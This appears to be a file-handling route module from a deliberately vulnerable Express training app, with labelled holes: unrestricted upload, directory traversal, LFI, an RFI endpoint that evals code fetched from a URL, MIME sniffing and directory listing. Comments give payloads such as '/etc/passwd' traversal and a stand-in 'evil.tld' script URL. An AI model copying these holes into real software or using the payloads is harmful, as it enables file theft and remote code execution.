/**
 * Files: directory traversal (#22), LFI (#23), RFI (#24), arbitrary/unrestricted
 * upload (#25/#26), MIME sniffing (#69), directory listing (#42).
 */
const express = require("express");
const fs = require("fs");
const path = require("path");
const multer = require("multer");

module.exports = (container) => {
  const config = container.resolve("config");
  const db = container.resolve("db");
  const r = express.Router();

  /* [VULN #25][#26] UNRESTRICTED upload: original filename preserved (path
     traversal in filename possible too), NO extension/MIME allowlist, NO
     content scan. 20MB cap only so the free-tier container survives. */
  const upload = multer({
    storage: multer.diskStorage({
      destination: (req, file, cb) => cb(null, config.uploadsDir),
      filename: (req, file, cb) => cb(null, file.originalname), // attacker-controlled name
    }),
    limits: { fileSize: 20 * 1024 * 1024 },
  });

  r.post("/api/files/upload", upload.single("file"), async (req, res, next) => {
    try {
      const f = req.file;
      if (!f) return res.status(400).json({ error: "no file (field name: 'file')" });
      await db.query(
        "INSERT INTO uploads (filename, original_name, uploader) VALUES ($1, $2, $3)",
        [f.filename, f.originalname, (req.body || {}).uploader || "anon"]
      );
      res.json({
        saved: f.filename,
        url: `/uploads/${f.filename}`,
        sniffUrl: `/uploads-sniff/${f.filename}`, // [VULN #69] served as text/plain but browsers sniff
        hint: "upload shell.html / x.svg / .php.jpg - no checks at all (#25/#26)",
      });
    } catch (e) {
      next(e);
    }
  });

  r.get("/api/files/list", async (req, res, next) => {
    try {
      const { rows } = await db.query("SELECT * FROM uploads ORDER BY id DESC");
      const onDisk = fs.readdirSync(config.uploadsDir);
      res.json({ uploads: rows, onDisk, dir: config.uploadsDir }); // [VULN #43] absolute server path leaked
    } catch (e) {
      next(e);
    }
  });

  /* [VULN #22] Directory traversal: name joins the uploads dir unsanitized.
     payload: ?name=../../../../etc/passwd  or ?name=/etc/passwd */
  r.get("/api/files/download", (req, res) => {
    const name = String(req.query.name || "");
    const p = path.join(config.uploadsDir, name);
    fs.readFile(p, (err, data) => {
      if (err) return res.status(404).json({ error: err.message, resolvedPath: p }); // [VULN #43]
      res.setHeader("Content-Type", "application/octet-stream");
      res.send(data);
    });
  });

  /* [VULN #23] LFI: ?page=../../../../etc/passwd
     [VULN #24] RFI: ?page=https://evil.tld/pwn.js -> fetched AND executed (eval) */
  r.get("/api/files/read", async (req, res, next) => {
    try {
      const page = String(req.query.page || "welcome.txt");
      if (/^https?:\/\//i.test(page)) {
        const resp = await fetch(page);
        const code = await resp.text();
        let result;
        try {
          result = eval(code); // [VULN #24][#27] remote file "inclusion" = RCE
        } catch (e) {
          result = `include executed with error: ${e.message}`;
        }
        return res.json({ mode: "RFI", remote: page, executed: String(result).slice(0, 2000) });
      }
      const p = path.join(__dirname, "..", "..", "views", page);
      fs.readFile(p, "utf8", (err, data) => {
        if (err) return res.status(404).json({ error: err.message, resolvedPath: p });
        res.type("text/plain").send(data);
      });
    } catch (e) {
      next(e);
    }
  });

  /* [VULN #69] MIME sniffing: body served as text/plain, no X-Content-Type-Options
     -> browsers with content sniffing render uploaded HTML. */
  r.get("/uploads-sniff/:name", (req, res) => {
    const p = path.join(config.uploadsDir, req.params.name);
    res.setHeader("Content-Type", "text/plain");
    // deliberately NOT setting X-Content-Type-Options: nosniff
    fs.createReadStream(p)
      .on("error", () => res.status(404).json({ error: "not found" }))
      .pipe(res);
  });

  /* served by express.static (correct ext type) AND by nginx /uploads (autoindex on) */
  r.use("/uploads", express.static(config.uploadsDir, { etag: false }));

  /* [VULN #42] directory listing endpoint (js view of the uploads dir) */
  r.get("/api/files/dir", (req, res) => {
    const dir = String(req.query.dir || config.uploadsDir);
    try {
      res.json({ dir, entries: fs.readdirSync(dir) }); // also an arbitrary-listing traversal
    } catch (e) {
      res.status(400).json({ error: e.message });
    }
  });

  return r;
};
